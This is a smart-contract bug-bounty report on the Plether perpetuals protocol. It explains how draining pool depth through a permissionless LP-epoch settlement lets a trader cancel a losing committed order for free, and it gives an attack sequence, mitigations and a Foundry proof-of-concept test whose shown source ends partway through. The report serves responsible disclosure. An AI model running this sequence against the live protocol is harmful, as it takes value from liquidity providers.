# \#98039 [SC-Low] Committed open orders can be cancelled at no cost after their fill price is known, because any caller can shrink HousePool depth through OrderRouter.settleLpEpoch (incomplete fix of SC-M4 component 3)

**Submitted on Nov 4th 2026 at 15:05:27 UTC by @abarbatei for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98039
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Contract fails to deliver promised returns, but doesn't lose value

## Description

## Brief/Intro

At commit [a82d4fefb02768e5b3bddcc97dee371eee24fea8](https://github.com/immunefi-team/audit-comp-plether/commit/a82d4fefb02768e5b3bddcc97dee371eee24fea8) an open order is re-planned at execution time against the live `HousePool.totalAssets()`, and the planner's skew cap `maxSkewAssets = netDepth * maxSkewRatio` reserves nothing for orders that are committed but not yet executed. `OrderRouter.settleLpEpoch` is permissionless and funds any matured LP redemption out of the pool, so any caller can lower `totalAssets()` by the matured amount at a moment of its choosing. A `SKEW_TOO_HIGH` or `SOLVENCY_EXCEEDED` result at execution is classified `ProtocolStateInvalidated` and terminalizes the order as `PlannerRejected` with the full margin released and, for a self-executing account, the bounty refunded. The consequence is that a trader who has committed an order sized near the cap, and who has (or who merely finds) a matured, not yet funded LP redemption, can wait until the order's fill tick and the ticks after it are public, then decide whether that order fills or is cancelled for free. SECURITY.md promises LPs that "binding order semantics and the lack of a user cancellation path prevent traders from turning queued intents into free options"; the fix shipped for the pre-audit finding SC-M4 (plether-core PR 24) changed only the oracle pricing rule and left this third component of SC-M4 intact. The value of the option is bounded by how far the basket moves inside the few seconds that honest keepers leave between commit and execution, so the pool does not lose value in the ordinary case; it fails to deliver the binding-order guarantee it promises, and in a fast market it pays a stale fill against LPs with no offsetting losing leg. The attached Foundry proof executes the whole cycle through public entrypoints and measures the economics at the release risk parameters.

## Vulnerability Details

### 1. Execution re-plans an open against live pool depth

When an order is executed, the sidecar builds the engine request from the current pool state, not from anything frozen at commit time:

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol#L950-L954

```solidity
        request.executionPrice = oracleResult.executionPrice;
        request.neutralMarkPrice = oracleResult.neutralMarkPrice;
        request.poolDepthAssets = IHousePool(engine_.pool()).totalAssets();
        request.oraclePublishTime = oracleResult.publishTime;
```

The pre-oracle item at L933 samples the same value, and `_callEngine` forwards it to `CfdEngine.processOrderTyped(order, executionPrice, poolDepthAssets, publishTime)`:

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol#L597-L600

```solidity
        bytes memory engineCall = abi.encodeCall(
            ICfdEngineCore.processOrderTyped,
            (context.order, request.executionPrice, request.poolDepthAssets, request.oraclePublishTime)
        );
```

### 2. The skew cap scales with that depth and reserves nothing for committed orders

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L448-L479

```solidity
        uint256 netDepthAssets =
            PositionRiskAccountingLib.computeNetPoolDepthAssets(snap.poolAssets, snap.totalTraderClaimBalanceAssets);
        if (netDepthAssets == 0) {
            delta.revertCode = CfdEnginePlanTypes.OpenRevertCode.SOLVENCY_EXCEEDED;
            return;
        }
        ...
        uint256 maxSkewAssets = Math.mulDiv(netDepthAssets, snap.riskParams.maxSkewRatio, CfdMath.WAD);
        if (
            inputs.postSkewAssets > maxSkewAssets
                && (inputs.postSkewAssets >= inputs.preSkewAssets || orderSideIsPostOpenHeavy)
        ) {
            delta.revertCode = CfdEnginePlanTypes.OpenRevertCode.SKEW_TOO_HIGH;
            return;
        }
```

`SKEW_TOO_HIGH` is also `CommitTimeRejectable` (L79-L94), so a leg that is over the cap at commit is refused at commit. A leg that is under the cap at commit passes and is only re-checked at execution, against whatever depth exists then.

### 3. The two depth-dependent codes are terminal at execution and release the margin

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L119-L126

```solidity
        if (
            code == CfdEnginePlanTypes.OpenRevertCode.DEGRADED_MODE
                || code == CfdEnginePlanTypes.OpenRevertCode.SKEW_TOO_HIGH
                || code == CfdEnginePlanTypes.OpenRevertCode.SOLVENCY_EXCEEDED
                || code == CfdEnginePlanTypes.OpenRevertCode.NUMERIC_DOMAIN_EXCEEDED
        ) {
            return CfdEnginePlanTypes.ExecutionFailurePolicyCategory.ProtocolStateInvalidated;
        }
```

The sidecar accepts that shape as a terminal planner rejection:

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol#L846-L853

```solidity
            if (
                knownCode && category == uint256(expectedCategory)
                    && expectedCategory != CfdEnginePlanTypes.ExecutionFailurePolicyCategory.None
            ) {
                classification.terminal = true;
                classification.plannerFailure = true;
                classification.plannerIsClose = isClose == 1;
                classification.reason = OrderV3Types.TerminalReason.PlannerRejected;
```

and the router releases the whole margin reservation and returns the bounty to the account when the account executed its own order:

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L301-L312

```solidity
        _onlySelfCall();
        (, CfdTypes.Order memory order) = _pendingOrder(orderId);
        clearinghouse.releaseOrderReservationForTerminalCleanup(orderId);
        settlement =
            _settleTerminalBounty(order, success, reason, bountyRecipient, accountingPrice, accountingPublishTime);
        if (success) {
            emit OrderExecuted(orderId, executionPrice);
        }
        _deleteOrder(
            orderId, success ? IOrderRouterAccounting.OrderStatus.Executed : IOrderRouterAccounting.OrderStatus.Failed
        );
```

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L333-L341

```solidity
        if (bountyAssets != 0) {
            settlement.bountyRecipient = bountyRecipient;
            settlement.bountyDisposition = OrderV3Types.BountyDisposition.Paid;
            if (bountyRecipient == order.account) {
                clearinghouse.releaseReservedExecutionBountyToSource(order.account, bountyAssets);
            } else {
                engine.creditBounty(
                    order.account, bountyRecipient, bountyAssets, accountingPrice, accountingPublishTime
                );
            }
```

If an honest keeper executes the cancelled leg instead, the account loses only the open bounty, 1 bp capped to the range 0.01 to 0.20 USDG (`OrderRouterBase.sol` L72-L74).

### 4. Any caller can shrink the depth on demand

`OrderRouter.settleLpEpoch` is `external payable` (OrderRouter.sol L479-L484) and delegates to the keeper sidecar:

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L549-L565

```solidity
    function settleLpEpoch(
        bytes[] calldata pythUpdateData
    ) external payable {
        _requireDelegateCall();

        IOrderLiquidationBatchHost host = IOrderLiquidationBatchHost(address(this));
        IPletherOracle oracle = host.pletherOracle();
        uint256 pythFee = oracle.getUpdateFee(pythUpdateData);
        if (msg.value < pythFee) {
            revert IPletherOracle.PletherOracle__InsufficientFee(msg.value, pythFee);
        }

        IPletherOracle.PriceSnapshot memory snapshot =
            oracle.updatePrice{value: pythFee}(msg.sender, pythUpdateData, IPletherOracle.PriceMode.PoolReconcile);
        host.engine().updateMarkPrice(snapshot.markPrice, snapshot.publishTime);

        address pool = address(oracle.housePool());
```

`HousePool.settleLpEpoch` (HousePool.sol L797-L821) only requires that the caller be the router with a current-epoch mark when positions are open, which the router path provides. `_settleLpEpoch` funds every matured redemption and decrements the accounting basis:

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L885-L888

```solidity
            if (juniorPhase.fundedAssets > 0) {
                juniorPrincipal -= juniorPhase.fundedAssets;
                accountedAssets -= juniorPhase.fundedAssets;
            }
```

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1007

```solidity
            settlementToken.safeTransfer(vaultAddress, fundedAssets);
```

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L426-L429

```solidity
    function totalAssets() public view returns (uint256) {
        uint256 raw = settlementToken.balanceOf(address(this));
        return raw < accountedAssets ? raw : accountedAssets;
    }
```

The withdrawal floor reserves only the live book (`maxLiability + traderClaims + supplemental`, HousePoolAccountingLib.sol L46-L55); a committed, unexecuted open reserves nothing, so the drain is not blocked by pending orders.

### 5. The fresh mark installed by the drain does not prevent executing the older fill tick

`settleLpEpoch` installs a newer mark. The later execution of the committed order still uses its own historical fill tick (the unique first Pyth tick after `commitTime`, PletherOracle.sol L610-L613), and both mark-update paths ignore a non-newer time:

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol#L1053-L1061

```solidity
    function _updateEngineMark(
        IOrderRouterExecutionHost host,
        OracleResult memory result
    ) private {
        ICfdEngineCore engine_ = ICfdEngineCore(host.engine());
        if (result.publishTime > engine_.lastMarkTime()) {
            engine_.updateMarkPrice(result.neutralMarkPrice, result.publishTime);
        }
    }
```

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L1146-L1154

```solidity
    function settlementApplyCarryAndMark(
        uint256 newMarkPrice,
        uint64 newMarkTime
    ) external onlySettlementSidecar {
        if (newMarkTime <= lastMarkTime) {
            return;
        }
        _applyCarryAndMark(newMarkPrice, newMarkTime);
    }
```

So the sequence "execute the winning leg at tick T, drain, execute the losing leg at the same tick T" is valid: the losing leg is priced at T and then rejected on depth.

### 6. Why this is an incomplete fix rather than a known issue

The pre-audit finding SC-M4 ("Risk Free Option in 60Sec Oracle Window") described three components: the 60 s keeper tick choice, the dual-order tick selection, and "Component 3: The LP Order Cancellation. When a price move is too large, the attacker can trigger a full margin refund on the losing order by manipulating the vault depth ... Executing the losing order then triggers SOLVENCY_EXCEEDED due to reduced vault depth. This propagates as ProtocolStateInvalidated, granting a full margin return." The team's response was "Fixed in Plether-Fi/plether-core#24". That PR replaced the keeper's tick choice with the unique-first-tick rule (components 1 and 2). Nothing in sections 1 to 5 above was changed: execution still re-plans on live depth, the cap still has no reservation for committed orders, the depth codes are still terminal with a full refund, and `settleLpEpoch` is still permissionless. Component 3 is live at the pinned commit, and SECURITY.md still states the guarantee it breaks:

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L658-L659

```text
- binding order semantics and the lack of a user cancellation path prevent traders from turning queued intents into
  free options,
```

### 7. Attack sequence (as executed by the proof)

One untrusted actor controls three ordinary accounts: an LP account holding a junior stake R, trader A and trader B. Release risk parameters are used (maxSkewRatio 0.4, executionFeeBps 4, vpiFactor 0.01, initMarginBps 20).

1. Epoch E: the LP account calls `TrancheVault.requestRedeem` for its whole junior stake (R = 400,000 USDG on a 10M USDG pool). The request matures at the start of epoch E+1 and is funded by whichever `settleLpEpoch` runs first after that.
2. Epoch E+1, before the honest LP keeper has settled: trader A commits a LONG for 100,000 USDG and trader B commits a SHORT for 3,980,800 USDG, 20,000 USDG under the commit-time cap `0.4 * totalAssets()`. Both pass the commit-time preview. Their fill price is the first Pyth tick after the commit block, T.
3. T is published and the following ticks show the basket moving. In the proof the mark falls 50 bp after T (a LONG profits when the mark falls, `CfdTypes.Side`); the LONG is the winner and the SHORT the loser.
4. The actor executes leg A itself at T (`OrderRouter.executeOrder` with the Pyth payload for T). It fills.
5. The LP account calls `OrderRouter.settleLpEpoch` with a fresh Pyth payload. Its matured redemption is funded out of the pool: `totalAssets()` falls from 10,002,000 to 9,602,070 USDG and the execution-time cap falls to 3,840,828 USDG.
6. The actor executes leg B at the same tick T. Post-open skew would be 3,880,800 USDG, above the new cap: `SKEW_TOO_HIGH`, classified `ProtocolStateInvalidated`, terminal `PlannerRejected`. The 30,000 USDG margin is released and the bounty is refunded to trader B, which withdraws its entire 40,000 USDG deposit.
7. The actor closes leg A at the moved price and withdraws; the LP account claims its redemption.

If the move had gone the other way the actor would simply have let both legs execute (or executed none of its own and let the keeper do it) and kept the large SHORT as the winner; the small LONG is a cheap hedge. The cancellation branch is the one that needs the lever, and it is the one the proof exercises. A single order sized near the cap gives the same option without the second leg.

### 8. Preconditions and timing (stated honestly)

- A matured, not yet funded LP redemption of size R with `0.4 * R` larger than the headroom of the target leg under the cap. The actor can create it one epoch ahead with its own stake, or use any third party's matured request (settlement is permissionless and funds all matured requests).
- The cycle must complete before the honest LP keeper settles the epoch (the reference keeper polls every 15 s; on the Arbitrum Sepolia v2.0.0 deployment the four settlements that had matured work landed 7, 10, 10 and 15 s after the hourly boundary), so the lever exists in the first seconds after an hourly boundary.
- The drain and the execution of the losing leg must land before an honest order keeper executes that leg at T. The reference keeper polls every second; on the Sepolia deployment all 105 orders ever committed executed 3 to 9 s after commit (median 6 s, p95 8 s, none failed, none expired). The contract itself allows up to `executionWindowSeconds` (60 s by default, 1 h admin ceiling), and an order nobody executes expires with margin and bounty refunded anyway.
- The option is therefore worth the basket move between T and the actor's decision inside that few-second window, net of the fees on the kept leg.

## Impact Details

Selected impact: "Contract fails to deliver promised returns, but doesn't lose value" (Low).

Mapping, stated plainly. SECURITY.md promises LPs that committed orders are binding and that traders cannot turn queued intents into free options; this report shows that at the pinned commit any trader can cancel a committed open at no cost after the fill tick and the ticks after it are public, which means the pool is quoting a free option it does not price. In the ordinary regime the pool does not lose value: the option is only worth the basket move inside the few seconds that honest keepers leave between commit and execution, and that move is usually below the fee floor. When the move is large (a news jump landing in that window), the pool pays a stale fill to the kept leg with no offsetting losing leg, and the loss is borne by the junior tranche. No theft of principal is claimed and no LP-side timing capture is relied on; the actor's own LP leg is booked at its NAV value and is a cost in the proof.

Measured cycle economics from the proof (6-decimal USDG, release parameters, kept leg 100,000 USDG, actor junior share 10% of a 4M junior tranche, 10M pool):

| Quantity | Staged 50 bp move (proof run, passes) | Break-even and reference figures |
| :-- | :-- | :-- |
| Cancelled leg (SHORT 3,980,800 USDG, margin 30,000) | Terminal `PlannerRejected` / `SKEW_TOO_HIGH`; margin and bounty returned; trader B withdraws its full 40,000 USDG | Cost of cancellation: 0 USDG when self-executed; at most 0.20 USDG (open bounty cap) if an honest keeper terminalizes it |
| Pool depth, before and after the actor's `settleLpEpoch` | 10,002,000 to 9,602,070 USDG | Cap moves from 4,000,800 to 3,840,828 USDG |
| Gross gain on the kept leg (LONG 100,000 USDG) | 500 USDG | Fee floor: open 4 bp plus close 4 bp = 8 bp of notional (79 USDG here) |
| Kept leg net after fees | +420 USDG | A 9 bp run of the same proof gives +10 USDG on the kept leg |
| Actor's LP leg (redemption minus the stake that funded it) | 65 USDG below stake (its 10% share of the pool's mark-to-market loss plus settlement fee) | At 9 bp: 24 USDG below stake |
| Actor net across the three accounts | +354 USDG | At 9 bp: 14 USDG below zero; break-even is about 10.5 bp at these sizes, up to about 13 bp when the live basket confidence sits at the accepted ceiling (two adverse shifts of up to 2.5 bp) |
| Incumbent junior principal change | 659 USDG below start (actor's own R removed from the comparison) | Zero or positive when the move is below the fee floor (the pool keeps the fees) |
| Window in which the move must occur | Staged by the fixture (fill at T, mark at T minus 50 bp before the actor acts) | Honest keeper latency: 3 to 9 s commit-to-execution over all 105 Sepolia v2.0.0 orders (median 6 s); 60 s contract default when no keeper executes; first roughly 15 s of an hourly epoch for the LP lever |

Per-cycle gain on the kept notional X is `X * (move - 8 bp)` minus the actor's share of the pool's mark-to-market on its own LP stake, and zero when the actor cancels. The expected value over a distribution of moves is positive for any distribution with a tail, but the magnitude inside a 3 to 9 s window on a six-currency basket is small, and a cycle needs a fresh matured redemption (or a third party's) at the top of an hour. That is why Low is proposed: the promised binding-order property is not delivered, the pool quotes an unpriced free option, and the capital at risk for LPs is the tail of the move distribution inside the keeper latency, not principal in the ordinary case. The 50 bp move in the proof is staged to make the mechanism and the arithmetic visible; it is not a claim about how often such a move occurs in that window.

## Mitigation

Any one of the following closes the lever; the first is the smallest change.

1. Freeze the depth used for the skew and solvency checks at commit time, or evaluate them at execution against `max(depthAtCommit, depthNow)`, so that a depth reduction after commit cannot flip a committed open into a terminal rejection. The commit-time preview already runs the same planner, so the commit-time `totalAssets()` can be stored on the order.
2. Treat `SKEW_TOO_HIGH` and `SOLVENCY_EXCEEDED` at execution as retryable within the execution window instead of terminal, so an order that was valid at commit is not cancelled by a transient depth change; the margin is still refunded on expiry.
3. Reserve committed-but-unexecuted open notional in `HousePool`'s withdrawal floor (`supplementalReservedAssets`) or in `computeNetPoolDepthAssets`, so that redemption funding cannot reduce the depth below what pending orders were validated against.
4. Independently of the above, update SECURITY.md so the binding-order claim is conditioned on execution-time depth, until the fix ships.

## References

- Execution builds the engine request from live depth: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol#L931-L954 and L592-L603
- Skew cap and solvency checks in the open planner: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L443-L480
- Depth codes are ProtocolStateInvalidated at execution: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L112-L129
- Terminal PlannerRejected classification and refund: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol#L827-L858 and https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L292-L344
- Permissionless LP epoch settlement: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L479-L484 and https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L549-L581
- Redemption funding reduces totalAssets: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L797-L821, L881-L888, L1004-L1008 and L426-L429
- Withdrawal floor reserves only the live book: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolAccountingLib.sol#L46-L55
- Historical fill tick rule and settlement window: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L610-L613 and L87
- Execution window bounds: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderExecutionOrchestrator.sol#L11 and https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterAdmin.sol#L31
- Binding-order guarantee and clock-alignment note: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L655-L660 and L701-L712
- Side semantics (LONG profits when the mark falls): https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdTypes.sol#L15-L19
- Pre-audit finding SC-M4 (component 3) and its response "Fixed in Plether-Fi/plether-core#24": SC Audit Studio pre-audit report, SC-M4; the PR changed only the oracle pricing rule.


## Proof of Concept

## Proof of Concept

The proof is a Foundry test that extends the repository's own `BasePerpTest` fixture. Every attack step is a transaction from one of the actor's three ordinary accounts to a public entrypoint: `OrderRouter.commitOrder`, `OrderRouter.executeOrder` (the actor is its own permissionless keeper), `OrderRouter.settleLpEpoch`, `OrderRouter.updateMarkPrice`, `TrancheVault.requestRedeem` / `claimRedeem`, `MarginClearinghouse.withdrawMargin`. No protocol contract is pranked. Suite helpers are used only to fund the pool and the traders before the attack and to stage the out-of-scope Pyth mock (`setAllUniquePrices` fixes the unique post-commit tick the oracle will find).

Setup:

1. Check out commit [a82d4fefb02768e5b3bddcc97dee371eee24fea8](https://github.com/immunefi-team/audit-comp-plether/commit/a82d4fefb02768e5b3bddcc97dee371eee24fea8) of https://github.com/immunefi-team/audit-comp-plether and install the Foundry dependencies as the repository README describes.
2. Create the directory `packages/perps/test/poc/lp-depth-drain-cancels-order/` and save the code below as `packages/perps/test/poc/lp-depth-drain-cancels-order/ProofLpRedemptionDrainCancelsLosingLeg.t.sol`.
3. From `packages/perps`, run:

```bash
FOUNDRY_TEST=test/poc/lp-depth-drain-cancels-order forge test --match-path 'test/poc/lp-depth-drain-cancels-order/*.t.sol' -vv
```

(`forge test --match-contract ProofLpRedemptionDrainCancelsLosingLeg -vv` from `packages/perps` runs the same test with the default test root.)

Expected result: the test passes. Assertion A shows the losing leg terminating with `Failed` / `PlannerRejected` and no position, after its fill price was fixed; assertion B shows trader B's full deposit back in its wallet; assertion C shows the kept leg realizing the move minus the two execution fees; assertion D shows the actor's combined wealth up and the incumbent junior principal down. Setting `MOVE_BPS` to 9 makes the final net-profit assertion fail (actor net 14 USDG below zero) while assertions A and B still hold, which is the break-even check described in Impact Details.

Proof source:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {CfdEnginePlanTypes} from "@plether/perps/CfdEnginePlanTypes.sol";
import {IAsyncTrancheVault} from "@plether/perps/interfaces/IAsyncTrancheVault.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";

/**
 * End-to-end proof. One untrusted actor controls three ordinary accounts:
 *   LP_ACCOUNT   junior liquidity provider holding a matured, not yet funded redemption request,
 *   TRADER_A     commits the small leg of an opposite-side pair (LONG),
 *   TRADER_B     commits the large leg of the pair (SHORT), sized just under the depth-scaled skew cap.
 *
 * Every attack step is a transaction sent by one of those accounts to a public entrypoint:
 * OrderRouter.commitOrder (production V3 bounded request), OrderRouter.executeOrder with caller-supplied
 * Pyth data (the actor is its own permissionless keeper), OrderRouter.settleLpEpoch with caller-supplied
 * Pyth data, OrderRouter.updateMarkPrice, TrancheVault.requestRedeem / claimRedeem and
 * MarginClearinghouse.withdrawMargin. No call pranks a protocol contract. Suite helpers are used only to fund
 * the pool and the traders before the attack and to stage the out-of-scope Pyth mock.
 *
 * Sequence:
 *  1. both legs are committed in one block at t1; their fill price is the first Pyth tick after t1 (T);
 *  2. the basket mark falls to P after T (staged on the Pyth mock); a LONG profits when the mark
 *     falls, so the LONG leg is the winner and the SHORT leg the loser;
 *  3. the actor executes the LONG leg at T (fills, mark moves to T);
 *  4. the actor calls settleLpEpoch with a fresh tick at P: its matured redemption is funded out of the
 *     pool, so HousePool.totalAssets() drops by the funded amount;
 *  5. the actor executes the SHORT leg at the same fill tick T: the planner re-validates it against the
 *     drained depth, returns SKEW_TOO_HIGH, the router classifies it ProtocolStateInvalidated ->
 *     terminal PlannerRejected, releases the full margin and refunds the bounty to the self-executor;
 *  6. the actor closes the LONG leg at P and withdraws; TRADER_B withdraws its full deposit.
 *
 * Assertions: the SHORT leg terminates with PlannerRejected / SKEW_TOO_HIGH after its fill price was
 * known; TRADER_B recovers its entire deposit; the kept LONG leg realizes P - T minus fees; the actor's
 * combined wealth across the three accounts rises, and the pool (the remaining LPs) pays for it.
 */
contract ProofLpRedemptionDrainCancelsLosingLeg is BasePerpTest {
    address internal constant LP_ACCOUNT = address(0xA11CE);
    address internal constant TRADER_A = address(0xA11CE0A);
    address internal constant TRADER_B = address(0xA11CE0B);
    address internal constant INCUMBENT_JUNIOR = address(0x1C1000);
    address internal constant INCUMBENT_SENIOR = address(0x5E0001);

    uint256 internal constant INCUMBENT_JUNIOR_ASSETS = 3_600_000e6;
    uint256 internal constant ACTOR_JUNIOR_ASSETS = 400_000e6; // the drain lever R
    uint256 internal constant SENIOR_ASSETS = 6_000_000e6;

    uint256 internal constant FILL_PRICE = 1e8; // T: first tick after commit
    uint256 internal constant MOVE_BPS = 50; // the staged move between T and the actor's decision
    // LONG profits when the basket mark falls (CfdTypes.Side), so the staged move is downward.
    uint256 internal constant LATER_PRICE = FILL_PRICE - (FILL_PRICE * MOVE_BPS) / 10_000; // P

    uint256 internal constant LEG_A_LOTS = 1_000; // 100,000 USDG notional at 1.00
    uint256 internal constant LEG_A_SIZE = LEG_A_LOTS * 1e20;
    uint256 internal constant LEG_A_MARGIN = 2_000e6;
    uint256 internal constant TRADER_A_FUNDING = 5_000e6;
    uint256 internal constant TRADER_B_MARGIN = 30_000e6;
    uint256 internal constant TRADER_B_FUNDING = 40_000e6;

    struct Run {
        uint256 poolAssetsAtCommit;
        uint256 poolAssetsAfterDrain;
        uint256 legBSize;
        uint256 wealthStart;
        uint256 wealthEnd;
        uint256 traderBBalanceBeforeCommit;
        uint256 redeemedAssets;
        uint256 juniorPrincipalBefore;
        uint256 juniorPrincipalAfter;
        uint256 traderABalanceBeforeCommit;
        uint256 traderABalanceAfterClose;
        OrderV3Types.ExecutionResult legBResult;
    }

    // ==================================================================
    // Fixture overrides: release risk parameters, no default LPs
    // ==================================================================

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    // ==================================================================
    // Pyth mock staging (out-of-scope component) and public-entrypoint helpers
    // ==================================================================

    /// @dev Stages the unique historical tick that the oracle's post-commit parse will find at `publishTime`.
    function _stageHistoricalTick(uint256 price, uint256 publishTime) internal returns (bytes[] memory data) {
        baseMockPyth.setAllUniquePrices(
            _basePythFeedIds(), SafeCast.toInt64(SafeCast.toInt256(price)), 0, int32(-8), publishTime, publishTime - 1
        );
        data = new bytes[](1);
        data[0] = abi.encode(price);
    }

    /// @dev Live-basket payload: the mock returns `price` published at the current block timestamp.
    function _liveTick(uint256 price) internal pure returns (bytes[] memory data) {
        data = new bytes[](1);
        data[0] = abi.encode(price);
    }

    function _request(
        CfdTypes.Side side,
        uint256 sizeDelta,
        uint256 marginDelta,
        uint256 targetPrice,
        bool isClose
    ) internal view returns (OrderV3Types.OrderRequest memory request) {
        uint256 window = router.maxExecutionWindowSeconds();
        request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode(side, sizeDelta, marginDelta, isClose, block.timestamp)),
            side: side,
            sizeDelta: sizeDelta,
            marginDelta: marginDelta,
            targetPrice: targetPrice,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(block.timestamp) + uint64(window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
    }

    function _commit(address account, OrderV3Types.OrderRequest memory request) internal returns (uint64 orderId) {
        vm.prank(account);
        orderId = router.commitOrder(request);
    }

    /// @dev `account` executes `orderId` as a permissionless keeper with the supplied historical payload.
    function _execute(address account, uint64 orderId, bytes[] memory data)
        internal
        returns (OrderV3Types.ExecutionResult memory result)
    {
        uint256 fee = router.pletherOracle().getOrderExecutionFee(data);
        vm.prank(account);
        result = router.executeOrder{value: fee}(orderId, data);
    }

    function _refreshMarkVia(address account, uint256 price) internal {
        bytes[] memory data = _liveTick(price);
        uint256 fee = router.pletherOracle().getUpdateFee(data);
        vm.prank(account);
        router.updateMarkPrice{value: fee}(data);
    }

    function _settleLpEpochVia(address account, uint256 price) internal {
        bytes[] memory data = _liveTick(price);
        uint256 fee = router.pletherOracle().getUpdateFee(data);
        vm.prank(account);
        router.settleLpEpoch{value: fee}(data);
    }

    function _wealth() internal view returns (uint256 total) {
        total = settlementToken.balanceOf(LP_ACCOUNT) + settlementToken.balanceOf(TRADER_A)
            + settlementToken.balanceOf(TRADER_B) + clearinghouse.balanceAssets(TRADER_A)
            + clearinghouse.balanceAssets(TRADER_B);
    }

    function _positionSize(address account) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(account);
    }

    // ==================================================================
    // Scenario
    // ==================================================================

    function _runScenario() internal returns (Run memory r) {
        // 1. Pre-attack state (suite helpers): 10M USDG pool, release senior share cap, funded traders.
        _fundJunior(INCUMBENT_JUNIOR, INCUMBENT_JUNIOR_ASSETS);
        _fundJunior(LP_ACCOUNT, ACTOR_JUNIOR_ASSETS);
